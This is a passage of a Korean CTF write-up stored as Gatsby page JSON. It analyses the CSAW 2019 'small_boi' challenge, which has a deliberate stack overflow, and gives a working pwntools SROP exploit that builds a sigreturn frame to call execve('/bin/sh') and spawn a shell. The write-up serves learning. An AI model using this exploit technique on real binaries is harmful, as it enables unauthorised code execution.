class=\"token operator\">*</span> fpstate<span class=\"token punctuation\">;</span>\n      __uint64_t __fpstate_word<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n  __uint64_t __reserved1 <span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>해당 <code class=\"language-text\">sigcontext</code> 구조체를 바탕으로 SROP 기법으 이용하여 공격을 진행할 수 있다.</li>\n</ul>\n<h2 id=\"문제-small_boic\" style=\"position:relative;\"><a href=\"#%EB%AC%B8%EC%A0%9C-small_boic\" aria-label=\"문제 small_boic permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>문제 small_boi.c</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token comment\">/* I wonder what you have to do with this sigreturn gadget */</span>\n<span class=\"token keyword\">volatile</span> <span class=\"token keyword\">void</span> <span class=\"token function\">one_true_gadget</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov $0xf, %eax;\"</span> <span class=\"token comment\">// sigreturn</span>\n        <span class=\"token string\">\"syscall;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"poprax:\"</span>\n    <span class=\"token string\">\"pop %rax;\"</span>\n    <span class=\"token string\">\"ret;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>useful_string <span class=\"token operator\">=</span> <span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">char</span> useful_byte <span class=\"token operator\">=</span> <span class=\"token string\">'i'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov %0, %%rsi;\"</span>\n        <span class=\"token operator\">:</span>\n        <span class=\"token operator\">:</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span>\n        <span class=\"token operator\">:</span> <span class=\"token string\">\"%rsi\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xor %rax, %rax;\"</span>\n        <span class=\"token string\">\"xor %rdi, %rdi;\"</span>\n        <span class=\"token string\">\"mov $0x200, %rdx;\"</span>\n        <span class=\"token string\">\"syscall;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xor %rdi, %rax;\"</span>\n        <span class=\"token string\">\"mov $60, %rax;\"</span>\n        <span class=\"token string\">\"syscall;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>문제 바이너리를 분석해 보면 <code class=\"language-text\">sigreturn</code> , <code class=\"language-text\">/bin/sh</code>, <code class=\"language-text\">syscall</code> 등 익스를 하기에 필요한 명령들이 있는 것을 확인할 수 있으며</li>\n<li>카니리 보호 기법이 걸려 있지 않아 버퍼 오버플로우를 발생시켜 return 주소를 sigreturn call 하여 SROP를 할 수 있다.</li>\n<li>main 함수에서 read 함수를 바탕으로 0x200 바이트를 입력 받기 때문에 버퍼 오버플로우가 발생한다.</li>\n</ul>\n<h2 id=\"srop\" style=\"position:relative;\"><a href=\"#srop\" aria-label=\"srop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SROP</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">binshell <span class=\"token operator\">=</span> <span class=\"token number\">0x4001ca</span>\nsi_return <span class=\"token operator\">=</span> <span class=\"token number\">0x400180</span>\nsyscall <span class=\"token operator\">=</span> <span class=\"token number\">0x400185</span>\n\nframe <span class=\"token operator\">=</span> <span class=\"token function\">SigreturnFrame</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nframe<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_execve\nframe<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> binshell\nframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall\n\npayload <span class=\"token operator\">=</span> <span class=\"token function\">p8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">40</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>si_return<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span>frame<span class=\"token punctuation\">)</span>\n<span class=\"token function\">sl</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n<span class=\"token function\">irt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>SROP를 하기 위해서는 구조체의 값을 일일이 다 맞쳐서 짜야 한다는 점이 있지만 pwntools의 도구를 사용하여 손 쉽게 해당 레지스터에 필요한 값을 줄 수 가 있다.</li>\n<li>우리는 execve 시스템 콜을 사용하여 /bin/sh 주소를 인자로 사용하여 쉘을 획득하면 된다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAACGElEQVQoz22O267aMBBF+ZCeBBKPPWM7duwQciHBQMIhcK6ifexTpf7/L1SBStWRKi1Z1thr9l6c6nYapn6Y+uNlN15t2WZFnZfbrGi0r+2md3UvfR2JLAYZM4oZRQyXIJeAi0zZ6+tHE8aVaiE/rlQdUR2rLsIyphp0zcAKXCOVQrmV0EthE3Ip2USoBc/c9fN70+0zMJ5chibHfE1eo1Wy2FpXAXYcOxCGsgTNSliu14JMOssqv3zc2t2hSqAHLAFrwAAi51KhqzNXADWcGqBZFioRBpTnDxmkDafJVa2RZg1kgBxQOV+kBVVwaRh6IA+kKUsxW/E5Hx4yZv7nr9/P17cD0ItQgctByFeOtXKlbSfj90ATlxdOG20ZZow82UYqx0kvuLLXj1u1DUUCFcM8FUUqGoYOyDKhUoFAcgYRNeMq5XN+wuUKaKHLbnq/9YeTUtb7Te5K7yspsyQVMcMnhtH9fGK45LQEiplccRmz+XVxLqrSlTLfaFeadb0EWnI5CwmPUhEl/OlOlIiZ+8YoxZjNLPbavoxTP05VF9owlE2vXYnGCZ1zZYXOlS1kvhbaCmVBmof2Vw7t7vX9dvn8EcZzdzjtT1MYz004Vv2h6Q+74bw7nreHU9n2ZLzQ+Rf54tbPYQjPL9sw+E0bM/y2gkfne0PxIE7F3P8+/CdX0hx3w/HyFsZzGC+74VzUHaMs+vrvv/wBNGWNQ8hTIrEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/74e85d1e0257e52b19b4afbfd362849d/37523/0.png\"\n        srcset=\"/static/74e85d1e0257e52b19b4afbfd362849d/e9ff0/0.png 180w,\n/static/74e85d1e0257e52b19b4afbfd362849d/f21e7/0.png 360w,\n/static/74e85d1e0257e52b19b4afbfd362849d/37523/0.png 720w,\n/static/74e85d1e0257e52b19b4afbfd362849d/7e509/0.png 745w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#restore_sigcontext\">restore_sigcontext</a></li>\n<li><a href=\"#sigcontext-32bit\">sigcontext-32bit</a></li>\n<li><a href=\"#sigcontext-64bit\">sigcontext-64bit</a></li>\n<li><a href=\"#%EB%AC%B8%EC%A0%9C-small_boic\">문제 small_boi.c</a></li>\n<li><a href=\"#srop\">SROP</a></li>\n</ul>\n</div>","frontmatter":{"date":"September 18, 2020","title":"CSAW 2019 small_boi 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🍗"},"fields":{"slug":"/csaw_small_boi_ctf_writeup/"}},"site":{"siteMetadata":{"siteUrl":"https://www.zoomkoding.com","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/csaw_popping_ctf_writeup/","nextSlug":"/zer0pts_music_ctf_writeup/","prevSlug":"/csaw_small_boi_ctf_writeup/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}